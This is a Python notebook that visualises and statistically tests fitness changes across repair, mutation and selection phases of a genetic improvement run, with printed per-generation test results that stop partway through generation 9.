# %% [markdown]
# # GI Results Visualization, Quantitative Analysis, and Inferential Statistics
#
# Notebook to display population statistics and fitness distribution for each generation of the GI loop

# %% [markdown]
# ### Imports and Settings

# %%
# %load_ext autoreload
# %autoreload 2

# imports
import os, sys
import pickle

# set the project root directory (~/projects/GIMC)
project_root = os.path.expanduser("~/projects/GIMC")

# add project root to sys.path
sys.path.append(project_root)

import numpy as np
import matplotlib.pyplot as plt

from config import DATA_PATH

# add project
checkpoint_path = os.path.join(DATA_PATH, 'GI', '20260316-02_cmd_checkpoint.pkl')

# %% [markdown]
# ### Read and verify checkpoint

# %%
with open(checkpoint_path, 'rb') as f:
    checkpoint = pickle.load(f)

    print(f"Checkpoint loaded successfully with {len(checkpoint)} generations")
# Out:
# Checkpoint loaded successfully with 20 generations

# %% [markdown]
# ### Compute selected_population meta phase

# %%
# For each generation, create a selected_population consisting of the top N individuals
# across all phases, where N is the initial population size
# Get initial population size
N = len(checkpoint[0]["population"])
for generation in checkpoint:
    # Combine all individuals from all phases
    all_individuals = []
    all_individuals.extend(generation["population"])
    all_individuals.extend(generation["repaired_population"])
    all_individuals.extend(generation["mutated_population"])
    all_individuals.extend(generation["repaired_mutants"])
    
    # deduplicate individuals based on candidate hash
    unique_individuals = {}
    for ind in all_individuals:
        candidate_hash = ind.get_candidate().hash
        if candidate_hash not in unique_individuals:
            unique_individuals[candidate_hash] = ind
    all_individuals = list(unique_individuals.values())

    # Sort by fitness (descending) and select top N
    all_individuals_sorted = sorted(all_individuals, 
                                   key=lambda g: g.get_candidate().get_fitness(), 
                                   reverse=True)
    selected_population = all_individuals_sorted[:N]
    
    # Add to generation dictionary
    generation["selected_population"] = selected_population

print(f"Created selected_population for all {len(checkpoint)} generations")
print(f"Selected population size: {len(checkpoint[0]['selected_population'])}")
# Out:
# Created selected_population for all 20 generations
# Selected population size: 31

# %% [markdown]
# ### Show generational distribution changes

# %%
# Visualization settings
bins = 20
alpha = 1
fixed_x_axis = (0,1)  # False for auto-scaling, True for global min/max, (0, 1) for fixed 0-1 range

# Calculate x-axis limits based on settings
if fixed_x_axis == (0, 1):
    x_limits = (0, 1)
elif fixed_x_axis:
    # Calculate global min/max across all generations
    all_fitness_scores = []
    for generation in checkpoint:
        all_fitness_scores.extend([genome.get_candidate().get_fitness() for genome in generation["population"]])
        all_fitness_scores.extend([genome.get_candidate().get_fitness() for genome in generation["repaired_population"]])
        all_fitness_scores.extend([genome.get_candidate().get_fitness() for genome in generation["mutated_population"]])
        all_fitness_scores.extend([genome.get_candidate().get_fitness() for genome in generation["repaired_mutants"]])
        all_fitness_scores.extend([genome.get_candidate().get_fitness() for genome in generation["selected_population"]])
    global_min = min(all_fitness_scores) if all_fitness_scores else 0.0
    global_max = max(all_fitness_scores) if all_fitness_scores else 1.0
    x_limits = (global_min, global_max)
else:
    x_limits = None

# for each generation, load results for all phases (population, repaired_population, mutated_population, repaired_mutants, selected_population)
for gen_idx, generation in enumerate(checkpoint):
    population = generation["population"]
    repaired_population = generation["repaired_population"]
    mutated_population = generation["mutated_population"]
    repaired_mutants = generation["repaired_mutants"]
    selected_population = generation["selected_population"]
    
    # Create a figure with 1 row and 5 columns
    fig, axes = plt.subplots(1, 5, figsize=(25, 5))
    fig.suptitle(f"Generation {gen_idx + 1} - Fitness Distribution", fontsize=16, fontweight='bold')

    # Population
    fitness_scores = [genome.get_candidate().get_fitness() for genome in population]
    mean_fitness = np.mean(fitness_scores) if fitness_scores else 0.0
    max_fitness = np.max(fitness_scores) if fitness_scores else 0.0
    min_fitness = np.min(fitness_scores) if fitness_scores else 0.0
    stdev_fitness = np.std(fitness_scores) if fitness_scores else 0.0
    n = len(fitness_scores)
    axes[0].hist(fitness_scores, bins=bins, alpha=alpha)
    axes[0].set_title("Population")
    axes[0].set_xlabel("Fitness Score")
    axes[0].set_ylabel("Frequency")
    if x_limits:
        axes[0].set_xlim(x_limits)
    axes[0].text(0.95, 0.95, f'n={n}\nμ={mean_fitness:.3f}\nσ={stdev_fitness:.3f}\nmax={max_fitness:.3f}\nmin={min_fitness:.3f}',
                 transform=axes[0].transAxes, fontsize=9, verticalalignment='top', horizontalalignment='right',
                 bbox=dict(boxstyle='round', facecolor='wheat', alpha=0.5))

    # Repaired Population
    fitness_scores = [genome.get_candidate().get_fitness() for genome in repaired_population]
    mean_fitness = np.mean(fitness_scores) if fitness_scores else 0.0
    max_fitness = np.max(fitness_scores) if fitness_scores else 0.0
    min_fitness = np.min(fitness_scores) if fitness_scores else 0.0
    stdev_fitness = np.std(fitness_scores) if fitness_scores else 0.0
    n = len(fitness_scores)
    axes[1].hist(fitness_scores, bins=bins, alpha=alpha)
    axes[1].set_title("Repaired Population")
    axes[1].set_xlabel("Fitness Score")
    axes[1].set_ylabel("Frequency")
    if x_limits:
        axes[1].set_xlim(x_limits)
    axes[1].text(0.95, 0.95, f'n={n}\nμ={mean_fitness:.3f}\nσ={stdev_fitness:.3f}\nmax={max_fitness:.3f}\nmin={min_fitness:.3f}',
                 transform=axes[1].transAxes, fontsize=9, verticalalignment='top', horizontalalignment='right',
                 bbox=dict(boxstyle='round', facecolor='wheat', alpha=0.5))

    # Mutated Population
    fitness_scores = [genome.get_candidate().get_fitness() for genome in mutated_population]
    mean_fitness = np.mean(fitness_scores) if fitness_scores else 0.0
    max_fitness = np.max(fitness_scores) if fitness_scores else 0.0
    min_fitness = np.min(fitness_scores) if fitness_scores else 0.0
    stdev_fitness = np.std(fitness_scores) if fitness_scores else 0.0
    n = len(fitness_scores)
    axes[2].hist(fitness_scores, bins=bins, alpha=alpha)
    axes[2].set_title("Mutated Population")
    axes[2].set_xlabel("Fitness Score")
    axes[2].set_ylabel("Frequency")
    if x_limits:
        axes[2].set_xlim(x_limits)
    axes[2].text(0.95, 0.95, f'n={n}\nμ={mean_fitness:.3f}\nσ={stdev_fitness:.3f}\nmax={max_fitness:.3f}\nmin={min_fitness:.3f}',
                 transform=axes[2].transAxes, fontsize=9, verticalalignment='top', horizontalalignment='right',
                 bbox=dict(boxstyle='round', facecolor='wheat', alpha=0.5))

    # Repaired Mutants
    fitness_scores = [genome.get_candidate().get_fitness() for genome in repaired_mutants]
    mean_fitness = np.mean(fitness_scores) if fitness_scores else 0.0
    max_fitness = np.max(fitness_scores) if fitness_scores else 0.0
    min_fitness = np.min(fitness_scores) if fitness_scores else 0.0
    stdev_fitness = np.std(fitness_scores) if fitness_scores else 0.0
    n = len(fitness_scores)
    axes[3].hist(fitness_scores, bins=bins, alpha=alpha)
    axes[3].set_title("Repaired Mutants")
    axes[3].set_xlabel("Fitness Score")
    axes[3].set_ylabel("Frequency")
    if x_limits:
        axes[3].set_xlim(x_limits)
    axes[3].text(0.95, 0.95, f'n={n}\nμ={mean_fitness:.3f}\nσ={stdev_fitness:.3f}\nmax={max_fitness:.3f}\nmin={min_fitness:.3f}',
                 transform=axes[3].transAxes, fontsize=9, verticalalignment='top', horizontalalignment='right',
                 bbox=dict(boxstyle='round', facecolor='wheat', alpha=0.5))

    # Selected Population (Top N across all phases)
    fitness_scores = [genome.get_candidate().get_fitness() for genome in selected_population]
    mean_fitness = np.mean(fitness_scores) if fitness_scores else 0.0
    max_fitness = np.max(fitness_scores) if fitness_scores else 0.0
    min_fitness = np.min(fitness_scores) if fitness_scores else 0.0
    stdev_fitness = np.std(fitness_scores) if fitness_scores else 0.0
    n = len(fitness_scores)
    if x_limits:
        axes[4].set_xlim(x_limits)
    axes[4].hist(fitness_scores, bins=bins, alpha=alpha)
    axes[4].set_title("Selected Population")
    axes[4].set_xlabel("Fitness Score")
    axes[4].set_ylabel("Frequency")

    axes[4].text(0.95, 0.95, f'n={n}\nμ={mean_fitness:.3f}\nσ={stdev_fitness:.3f}\nmax={max_fitness:.3f}\nmin={min_fitness:.3f}',
                 transform=axes[4].transAxes, fontsize=9, verticalalignment='top', horizontalalignment='right',
                 bbox=dict(boxstyle='round', facecolor='wheat', alpha=0.5))

    plt.tight_layout()
    plt.show()

# %% [markdown]
# ### Graph fitness scores across generations

# %%
# create a 2d line plot of mean, min, and max fitness scores across generations - for population, repaired_population, mutated_population, repaired_mutants, and selected_population on single row plot 
# Create a figure with 1 row and 5 columns for all five populations
fig, axes = plt.subplots(1, 5, figsize=(25, 5))
fig.suptitle('Fitness Scores Across Generations', fontsize=16, fontweight='bold')

# Population types to plot
population_types = ['population', 'repaired_population', 'mutated_population', 'repaired_mutants', 'selected_population']
titles = ['Population', 'Repaired Population', 'Mutated Population', 'Repaired Mutants', 'Selected Population']

for idx, (pop_type, title) in enumerate(zip(population_types, titles)):
    mean_scores = []
    min_scores = []
    max_scores = []
    
    for generation in checkpoint:
        pop = generation[pop_type]
        fitness_scores = [genome.get_candidate().get_fitness() for genome in pop]
        mean_scores.append(np.mean(fitness_scores) if fitness_scores else 0.0)
        min_scores.append(np.min(fitness_scores) if fitness_scores else 0.0)
        max_scores.append(np.max(fitness_scores) if fitness_scores else 0.0)
    
    axes[idx].plot(mean_scores, label='Mean Fitness')
    axes[idx].plot(min_scores, label='Min Fitness')
    axes[idx].plot(max_scores, label='Max Fitness')
    axes[idx].set_xlabel('Generation')
    axes[idx].set_ylabel('Fitness Score')
    axes[idx].set_title(title)
    axes[idx].legend()

plt.tight_layout()
plt.show()

# %%
# combine all five phases into a single line - treat each phase a generation
all_phases = []
for generation in checkpoint:
    all_phases.extend([generation["population"], generation["repaired_population"], generation["mutated_population"], generation["repaired_mutants"], generation["selected_population"]])

mean_fitness_scores = []
min_fitness_scores = []
max_fitness_scores = []

for phase in all_phases:
    fitness_scores = [genome.get_candidate().get_fitness() for genome in phase]
    mean_fitness_scores.append(np.mean(fitness_scores) if fitness_scores else 0.0)
    min_fitness_scores.append(np.min(fitness_scores) if fitness_scores else 0.0)
    max_fitness_scores.append(np.max(fitness_scores) if fitness_scores else 0.0)

plt.figure(figsize=(10, 6))

# Plot raw data with transparency and get color handles
line1 = plt.plot(mean_fitness_scores, alpha=0.3, label='Mean Fitness')
line2 = plt.plot(min_fitness_scores, alpha=0.3, label='Min Fitness')
line3 = plt.plot(max_fitness_scores, alpha=0.3, label='Max Fitness')

# Add smoothed trend lines using moving average
from scipy.ndimage import uniform_filter1d
window_size = min(15, len(mean_fitness_scores) // 3)  # Adaptive window size

mean_smoothed = uniform_filter1d(mean_fitness_scores, size=window_size, mode='nearest')
min_smoothed = uniform_filter1d(min_fitness_scores, size=window_size, mode='nearest')
max_smoothed = uniform_filter1d(max_fitness_scores, size=window_size, mode='nearest')

# Plot smoothed lines with matching colors
plt.plot(mean_smoothed, color=line1[0].get_color(), linewidth=2.0, 
         label='Mean Fitness (Smoothed)', linestyle='--')
plt.plot(min_smoothed, color=line2[0].get_color(), linewidth=2.0, 
         label='Min Fitness (Smoothed)', linestyle='--')
plt.plot(max_smoothed, color=line3[0].get_color(), linewidth=2.0, 
         label='Max Fitness (Smoothed)', linestyle='--')

plt.xlabel('Generation Sub-Phases')
plt.ylabel('Fitness Score')
plt.title('Fitness Scores Across Generations - All Phases Treated as Sub-Generations')
plt.legend()
plt.show()

# %% [markdown]
# ### Statistical impact of each phase on the previous

# %%
from scipy import stats
import pandas as pd

def cohen_d(group1, group2):
    """Calculate Cohen's d effect size"""
    n1, n2 = len(group1), len(group2)
    var1, var2 = np.var(group1, ddof=1), np.var(group2, ddof=1)
    pooled_std = np.sqrt(((n1-1)*var1 + (n2-1)*var2) / (n1+n2-2))
    return (np.mean(group1) - np.mean(group2)) / pooled_std if pooled_std > 0 else 0

def analyze_phase_transition(before, after, phase_name, gen_idx):
    """Analyze statistical difference between two phases"""
    before_scores = np.array([g.get_candidate().get_fitness() for g in before])
    after_scores = np.array([g.get_candidate().get_fitness() for g in after])
    
    # Descriptive statistics
    before_mean, before_std = np.mean(before_scores), np.std(before_scores)
    after_mean, after_std = np.mean(after_scores), np.std(after_scores)
    mean_diff = after_mean - before_mean
    pct_change = (mean_diff / before_mean * 100) if before_mean != 0 else 0
    
    # Normality tests
    _, before_p_norm = stats.shapiro(before_scores) if len(before_scores) <= 5000 else (None, 0.05)
    _, after_p_norm = stats.shapiro(after_scores) if len(after_scores) <= 5000 else (None, 0.05)
    
    # Choose appropriate test
    if before_p_norm > 0.05 and after_p_norm > 0.05:
        # Both normal - use t-test
        t_stat, p_value = stats.ttest_ind(after_scores, before_scores)
        test_used = "Independent t-test"
    else:
        # Non-normal - use Mann-Whitney U
        u_stat, p_value = stats.mannwhitneyu(after_scores, before_scores, alternative='two-sided')
        test_used = "Mann-Whitney U"
    
    # Effect size
    effect_size = cohen_d(after_scores, before_scores)
    
    # Effect size interpretation
    if abs(effect_size) < 0.2:
        effect_interp = "negligible"
    elif abs(effect_size) < 0.5:
        effect_interp = "small"
    elif abs(effect_size) < 0.8:
        effect_interp = "medium"
    else:
        effect_interp = "large"
    
    return {
        'generation': gen_idx + 1,
        'phase': phase_name,
        'before_mean': before_mean,
        'before_std': before_std,
        'after_mean': after_mean,
        'after_std': after_std,
        'mean_diff': mean_diff,
        'pct_change': pct_change,
        'p_value': p_value,
        'significant': p_value < 0.05,
        'effect_size': effect_size,
        'effect_interp': effect_interp,
        'test_used': test_used,
        'n_before': len(before_scores),
        'n_after': len(after_scores)
    }

# Analyze each generation
results = []

for gen_idx, generation in enumerate(checkpoint):
    population = generation["population"]
    repaired_population = generation["repaired_population"]
    mutated_population = generation["mutated_population"]
    repaired_mutants = generation["repaired_mutants"]
    selected_population = generation["selected_population"]
    
    # 1. Repair operation impact (population -> repaired_population)
    results.append(analyze_phase_transition(
        population, repaired_population, 
        "Repair Operation", gen_idx
    ))
    
    # 2. Mutation operation impact (repaired_population -> mutated_population)
    results.append(analyze_phase_transition(
        repaired_population, mutated_population,
        "Mutation Operation", gen_idx
    ))
    
    # 3. Repair mutant operation impact (mutated_population -> repaired_mutants)
    results.append(analyze_phase_transition(
        mutated_population, repaired_mutants,
        "Repair Mutants Operation", gen_idx
    ))
    
    # 4. Selection operation impact (repaired_mutants -> selected_population)
    results.append(analyze_phase_transition(
        repaired_mutants, selected_population,
        "Selection Operation", gen_idx
    ))

# Convert to DataFrame for easier analysis
df_results = pd.DataFrame(results)

# Display per-generation results
print("="*100)
print("PER-GENERATION STATISTICAL ANALYSIS")
print("="*100)

for gen_idx in range(len(checkpoint)):
    gen_data = df_results[df_results['generation'] == gen_idx + 1]
    print(f"\n{'='*100}")
    print(f"GENERATION {gen_idx + 1}")
    print('='*100)
    
    for _, row in gen_data.iterrows():
        print(f"\n{row['phase']}:")
        print(f"  Before: μ={row['before_mean']:.4f}, σ={row['before_std']:.4f}, n={row['n_before']}")
        print(f"  After:  μ={row['after_mean']:.4f}, σ={row['after_std']:.4f}, n={row['n_after']}")
        print(f"  Change: Δμ={row['mean_diff']:+.4f} ({row['pct_change']:+.2f}%)")
        print(f"  Test: {row['test_used']}, p={row['p_value']:.4f} {'***' if row['p_value'] < 0.001 else '**' if row['p_value'] < 0.01 else '*' if row['p_value'] < 0.05 else 'ns'}")
        print(f"  Effect Size: Cohen's d={row['effect_size']:.4f} ({row['effect_interp']})")
        print(f"  Significant: {'YES' if row['significant'] else 'NO'}")

# Aggregate analysis across all generations
print(f"\n\n{'='*100}")
print("AGGREGATE ANALYSIS ACROSS ALL GENERATIONS")
print('='*100)

for phase in ["Repair Operation", "Mutation Operation", "Repair Mutants Operation", "Selection Operation"]:
    phase_data = df_results[df_results['phase'] == phase]
    
    print(f"\n{phase}:")
    print(f"  Average Mean Change: {phase_data['mean_diff'].mean():+.4f} (±{phase_data['mean_diff'].std():.4f})")
    print(f"  Average % Change: {phase_data['pct_change'].mean():+.2f}% (±{phase_data['pct_change'].std():.2f}%)")
    print(f"  Average Effect Size: {phase_data['effect_size'].mean():.4f} (±{phase_data['effect_size'].std():.4f})")
    print(f"  Significant in {phase_data['significant'].sum()}/{len(phase_data)} generations")
    print(f"  Consistency: {phase_data['significant'].mean()*100:.1f}% of generations show significant effect")
    
    # Test if effect sizes are consistently different from zero
    _, p_effect = stats.ttest_1samp(phase_data['effect_size'], 0)
    print(f"  Meta-analysis: Effect size significantly different from 0? p={p_effect:.4f} {'YES' if p_effect < 0.05 else 'NO'}")

# Visualize results
fig, axes = plt.subplots(2, 2, figsize=(16, 12))

# 1. Mean change by phase
phases = ["Repair Operation", "Mutation Operation", "Repair Mutants Operation", "Selection Operation"]
colors = ['#1f77b4', '#ff7f0e', '#2ca02c', '#9467bd']

for idx, phase in enumerate(phases):
    ax = axes[idx // 2, idx % 2]
    phase_data = df_results[df_results['phase'] == phase].sort_values('generation')
    
    x = phase_data['generation']
    y = phase_data['mean_diff']
    
    ax.bar(x, y, color=colors[idx], alpha=0.7, edgecolor='black')
    ax.axhline(y=0, color='black', linestyle='--', linewidth=1)
    ax.set_xlabel('Generation')
    ax.set_ylabel('Mean Fitness Change (Δμ)')
    ax.set_title(f'{phase}\nAvg Δμ={phase_data["mean_diff"].mean():+.4f}, Avg d={phase_data["effect_size"].mean():.3f}')
    ax.grid(True, alpha=0.3)
    
    # Add significance markers
    for i, (gen, diff, sig) in enumerate(zip(x, y, phase_data['significant'])):
        if sig:
            ax.text(gen, diff, '*', ha='center', va='bottom' if diff > 0 else 'top', 
                   fontsize=16, fontweight='bold', color='red')

plt.tight_layout()
plt.show()

# Effect size comparison across phases
fig, ax = plt.subplots(figsize=(12, 6))

positions = []
data_to_plot = []
labels = []

for idx, phase in enumerate(phases):
    phase_data = df_results[df_results['phase'] == phase]['effect_size'].values
    data_to_plot.append(phase_data)
    positions.append(idx + 1)
    labels.append(phase.replace(' Operation', ''))

bp = ax.boxplot(data_to_plot, positions=positions, tick_labels=labels, patch_artist=True,
                showmeans=True, meanline=True)

for patch, color in zip(bp['boxes'], colors):
    patch.set_facecolor(color)
    patch.set_alpha(0.7)

ax.axhline(y=0, color='black', linestyle='--', linewidth=1, alpha=0.5)
ax.axhline(y=0.2, color='gray', linestyle=':', linewidth=1, alpha=0.3, label='Small effect')
ax.axhline(y=0.5, color='gray', linestyle=':', linewidth=1, alpha=0.3, label='Medium effect')
ax.axhline(y=0.8, color='gray', linestyle=':', linewidth=1, alpha=0.3, label='Large effect')
ax.axhline(y=-0.2, color='gray', linestyle=':', linewidth=1, alpha=0.3)
ax.axhline(y=-0.5, color='gray', linestyle=':', linewidth=1, alpha=0.3)
ax.axhline(y=-0.8, color='gray', linestyle=':', linewidth=1, alpha=0.3)

ax.set_ylabel("Cohen's d (Effect Size)")
ax.set_title("Effect Size Distribution Across Generations by Phase")
ax.grid(True, alpha=0.3, axis='y')
ax.legend()

plt.tight_layout()
plt.show()

# Summary table
print(f"\n\n{'='*100}")
print("SUMMARY TABLE")
print('='*100)
print(df_results.groupby('phase').agg({
    'mean_diff': ['mean', 'std', 'min', 'max'],
    'effect_size': ['mean', 'std', 'min', 'max'],
    'significant': ['sum', 'mean']
}).round(4))
# Out:
# ====================================================================================================
# PER-GENERATION STATISTICAL ANALYSIS
# ====================================================================================================
#
# ====================================================================================================
# GENERATION 1
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.0911, σ=0.1058, n=31
#   After:  μ=0.0898, σ=0.1068, n=31
#   Change: Δμ=-0.0013 (-1.43%)
#   Test: Mann-Whitney U, p=0.6744 ns
#   Effect Size: Cohen's d=-0.0121 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.0898, σ=0.1068, n=31
#   After:  μ=0.0757, σ=0.1057, n=31
#   Change: Δμ=-0.0141 (-15.71%)
#   Test: Mann-Whitney U, p=0.1771 ns
#   Effect Size: Cohen's d=-0.1306 (negligible)
#   Significant: NO
#
# Repair Mutants Operation:
#   Before: μ=0.0757, σ=0.1057, n=31
#   After:  μ=0.0997, σ=0.1110, n=31
#   Change: Δμ=+0.0240 (+31.67%)
#   Test: Mann-Whitney U, p=0.0882 ns
#   Effect Size: Cohen's d=0.2175 (small)
#   Significant: NO
#
# Selection Operation:
#   Before: μ=0.0997, σ=0.1110, n=31
#   After:  μ=0.1621, σ=0.0854, n=31
#   Change: Δμ=+0.0624 (+62.60%)
#   Test: Mann-Whitney U, p=0.0042 **
#   Effect Size: Cohen's d=0.6197 (medium)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 2
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.1273, σ=0.0761, n=62
#   After:  μ=0.1266, σ=0.0772, n=62
#   Change: Δμ=-0.0007 (-0.57%)
#   Test: Mann-Whitney U, p=0.9453 ns
#   Effect Size: Cohen's d=-0.0095 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.1266, σ=0.0772, n=62
#   After:  μ=0.1053, σ=0.0685, n=62
#   Change: Δμ=-0.0213 (-16.85%)
#   Test: Mann-Whitney U, p=0.0820 ns
#   Effect Size: Cohen's d=-0.2897 (small)
#   Significant: NO
#
# Repair Mutants Operation:
#   Before: μ=0.1053, σ=0.0685, n=62
#   After:  μ=0.1186, σ=0.0672, n=62
#   Change: Δμ=+0.0134 (+12.69%)
#   Test: Mann-Whitney U, p=0.1607 ns
#   Effect Size: Cohen's d=0.1952 (negligible)
#   Significant: NO
#
# Selection Operation:
#   Before: μ=0.1186, σ=0.0672, n=62
#   After:  μ=0.1778, σ=0.0850, n=31
#   Change: Δμ=+0.0592 (+49.88%)
#   Test: Mann-Whitney U, p=0.0003 ***
#   Effect Size: Cohen's d=0.7947 (medium)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 3
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.1239, σ=0.0862, n=63
#   After:  μ=0.1306, σ=0.0881, n=63
#   Change: Δμ=+0.0067 (+5.43%)
#   Test: Mann-Whitney U, p=0.7174 ns
#   Effect Size: Cohen's d=0.0765 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.1306, σ=0.0881, n=63
#   After:  μ=0.1004, σ=0.0815, n=63
#   Change: Δμ=-0.0303 (-23.17%)
#   Test: Mann-Whitney U, p=0.0230 *
#   Effect Size: Cohen's d=-0.3537 (small)
#   Significant: YES
#
# Repair Mutants Operation:
#   Before: μ=0.1004, σ=0.0815, n=63
#   After:  μ=0.1170, σ=0.0794, n=63
#   Change: Δμ=+0.0167 (+16.63%)
#   Test: Mann-Whitney U, p=0.1014 ns
#   Effect Size: Cohen's d=0.2059 (small)
#   Significant: NO
#
# Selection Operation:
#   Before: μ=0.1170, σ=0.0794, n=63
#   After:  μ=0.2004, σ=0.0788, n=31
#   Change: Δμ=+0.0833 (+71.18%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=1.0407 (large)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 4
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.1545, σ=0.0730, n=61
#   After:  μ=0.1545, σ=0.0730, n=61
#   Change: Δμ=+0.0000 (+0.00%)
#   Test: Mann-Whitney U, p=1.0000 ns
#   Effect Size: Cohen's d=0.0000 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.1545, σ=0.0730, n=61
#   After:  μ=0.1220, σ=0.0787, n=61
#   Change: Δμ=-0.0325 (-21.04%)
#   Test: Mann-Whitney U, p=0.0114 *
#   Effect Size: Cohen's d=-0.4248 (small)
#   Significant: YES
#
# Repair Mutants Operation:
#   Before: μ=0.1220, σ=0.0787, n=61
#   After:  μ=0.1502, σ=0.0775, n=61
#   Change: Δμ=+0.0282 (+23.14%)
#   Test: Mann-Whitney U, p=0.0371 *
#   Effect Size: Cohen's d=0.3584 (small)
#   Significant: YES
#
# Selection Operation:
#   Before: μ=0.1502, σ=0.0775, n=61
#   After:  μ=0.2420, σ=0.0646, n=31
#   Change: Δμ=+0.0918 (+61.09%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=1.2367 (large)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 5
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.1721, σ=0.0844, n=64
#   After:  μ=0.1720, σ=0.0846, n=64
#   Change: Δμ=-0.0001 (-0.06%)
#   Test: Mann-Whitney U, p=1.0000 ns
#   Effect Size: Cohen's d=-0.0012 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.1720, σ=0.0846, n=64
#   After:  μ=0.0885, σ=0.0773, n=64
#   Change: Δμ=-0.0836 (-48.58%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=-1.0228 (large)
#   Significant: YES
#
# Repair Mutants Operation:
#   Before: μ=0.0885, σ=0.0773, n=64
#   After:  μ=0.1343, σ=0.0858, n=64
#   Change: Δμ=+0.0458 (+51.83%)
#   Test: Mann-Whitney U, p=0.0010 **
#   Effect Size: Cohen's d=0.5569 (medium)
#   Significant: YES
#
# Selection Operation:
#   Before: μ=0.1343, σ=0.0858, n=64
#   After:  μ=0.2675, σ=0.0557, n=31
#   Change: Δμ=+0.1332 (+99.17%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=1.7052 (large)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 6
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.1678, σ=0.1106, n=64
#   After:  μ=0.1719, σ=0.1100, n=64
#   Change: Δμ=+0.0041 (+2.45%)
#   Test: Mann-Whitney U, p=0.8635 ns
#   Effect Size: Cohen's d=0.0370 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.1719, σ=0.1100, n=64
#   After:  μ=0.1185, σ=0.1081, n=64
#   Change: Δμ=-0.0533 (-31.03%)
#   Test: Mann-Whitney U, p=0.0044 **
#   Effect Size: Cohen's d=-0.4849 (small)
#   Significant: YES
#
# Repair Mutants Operation:
#   Before: μ=0.1185, σ=0.1081, n=64
#   After:  μ=0.1582, σ=0.1258, n=64
#   Change: Δμ=+0.0396 (+33.42%)
#   Test: Mann-Whitney U, p=0.0433 *
#   Effect Size: Cohen's d=0.3350 (small)
#   Significant: YES
#
# Selection Operation:
#   Before: μ=0.1582, σ=0.1258, n=64
#   After:  μ=0.3101, σ=0.0726, n=31
#   Change: Δμ=+0.1520 (+96.10%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=1.3510 (large)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 7
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.2185, σ=0.1365, n=60
#   After:  μ=0.2211, σ=0.1366, n=60
#   Change: Δμ=+0.0026 (+1.19%)
#   Test: Mann-Whitney U, p=0.9255 ns
#   Effect Size: Cohen's d=0.0188 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.2211, σ=0.1366, n=60
#   After:  μ=0.0998, σ=0.1200, n=60
#   Change: Δμ=-0.1213 (-54.85%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=-0.9354 (large)
#   Significant: YES
#
# Repair Mutants Operation:
#   Before: μ=0.0998, σ=0.1200, n=60
#   After:  μ=0.1790, σ=0.1366, n=60
#   Change: Δμ=+0.0792 (+79.29%)
#   Test: Mann-Whitney U, p=0.0001 ***
#   Effect Size: Cohen's d=0.6104 (medium)
#   Significant: YES
#
# Selection Operation:
#   Before: μ=0.1790, σ=0.1366, n=60
#   After:  μ=0.3610, σ=0.0861, n=31
#   Change: Δμ=+0.1820 (+101.70%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=1.4779 (large)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 8
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.2074, σ=0.1667, n=64
#   After:  μ=0.2081, σ=0.1660, n=64
#   Change: Δμ=+0.0007 (+0.31%)
#   Test: Mann-Whitney U, p=0.8494 ns
#   Effect Size: Cohen's d=0.0039 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.2081, σ=0.1660, n=64
#   After:  μ=0.1190, σ=0.1502, n=64
#   Change: Δμ=-0.0891 (-42.80%)
#   Test: Mann-Whitney U, p=0.0004 ***
#   Effect Size: Cohen's d=-0.5584 (medium)
#   Significant: YES
#
# Repair Mutants Operation:
#   Before: μ=0.1190, σ=0.1502, n=64
#   After:  μ=0.1576, σ=0.1574, n=64
#   Change: Δμ=+0.0385 (+32.38%)
#   Test: Mann-Whitney U, p=0.0175 *
#   Effect Size: Cohen's d=0.2485 (small)
#   Significant: YES
#
# Selection Operation:
#   Before: μ=0.1576, σ=0.1574, n=64
#   After:  μ=0.3861, σ=0.0846, n=31
#   Change: Δμ=+0.2286 (+145.06%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=1.6394 (large)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 9
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.2662, σ=0.1693, n=51
#   After:  μ=0.2768, σ=0.1602, n=51
#   Change: Δμ=+0.0106 (+3.99%)
#   Test: Mann-Whitney U, p=0.7853 ns
#   Effect Size: Cohen's d=0.0637 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.2768, σ=0.1602, n=51
#   After:  μ=0.1256, σ=0.1671, n=51
#   Change: Δμ=-0.1512 (-54.61%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=-0.9142 (large)
#   Significant: YES
#
# Repair Mutants Operation:
#   Before: μ=0.1256, σ=0.1671, n=51
#   After:  μ=0.2260, σ=0.1860, n=51
#   Change: Δμ=+0.1004 (+79.92%)
#   Test: Mann-Whitney U, p=0.0004 ***
#   Effect Size: Cohen's d=0.5623 (medium)
#   Significant: YES
#
# Selection Operation:
#   Before: μ=0.2260, σ=0.1860, n=51
#   After:  μ=0.4357, σ=0.0862, n=31
